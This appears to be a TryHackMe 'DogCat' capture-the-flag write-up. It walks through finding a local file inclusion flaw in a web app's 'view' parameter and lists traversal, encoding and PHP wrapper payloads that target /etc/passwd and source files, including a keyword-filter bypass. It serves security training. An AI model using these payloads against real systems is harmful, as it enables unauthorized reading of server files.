# DogCat TryHackMe

**Enumeration**

**Nmap:**

![image](https://user-images.githubusercontent.com/79543461/176386293-cbf1ba92-20aa-4012-9bca-efaeb883aaba.png)

Seeing only SSH and HTTP open, it seems that it will be a web vulnerability

**WhatWeb:**

![image](https://user-images.githubusercontent.com/79543461/176386911-cc73be86-9d60-4c08-8959-e0087ee3ff47.png)

**Web with Browser:**

![image](https://user-images.githubusercontent.com/79543461/176389233-3105ec6b-e61a-4df5-bef0-8f3f5faecd19.png)

**I click in dog and i see this:**

![image](https://user-images.githubusercontent.com/79543461/176389528-0e08f17b-3915-461e-a495-691a1ccf0ec5.png)

**In URL i see "view" parameter, It looks like LFI, let's try basic payloads**

![image](https://user-images.githubusercontent.com/79543461/176389910-70dcc9e5-b0b6-423d-a29b-9a8ddcd61392.png)

That message can mean two things.

Or they have protected the LFI website, Or the devoloper added filters so that an LFI cannot be executed so easily

**Payloads:**

../../../../etc/passwd = **No Work**

../../../../etc/passwd%00 = **No Work**

%252e%252e%252fetc%252fpasswd = **No Work**

%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00 = **No Work**

/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd = **No Work**

**Wrappers:**

Let's try with LFI Wrappers:

expect://whoami = **No Work**

php://filter/convert.base64-encode/resource=index.php = **No work**

Okey anything work, but i try to put cat or dog, it is possible that the filter checks if there is the word dog or cat.

Payload: **dog/etc/passwd**

![image](https://user-images.githubusercontent.com/79543461/176392772-34d8dbd7-ab20-4949-bf3a-97a9e4aa33df.png)

**That's It!!**

Every time I click on cat or dog I get a different picture, that makes me think that it could be a php file that is executed.

But looking at the source code it is very clear to me.

Therefore, to check it is necessary to send a base64 filter in the wrapper and ask it to give me the page cat or dog.

![image](https://user-images.githubusercontent.com/79543461/176395381-0726391b-8cc3-49cd-a33c-561605793226.png)

**WORKS!!! Lets go to Decode Base64 code**

![image](https://user-images.githubusercontent.com/79543461/176395536-b72fb120-52a8-4f4d-8e30-6a11189a9d90.png)

Same with dogs file

![image](https://user-images.githubusercontent.com/79543461/176396151-bc86b5d4-77ca-42fb-90fc-6c2caf3b8ce7.png)

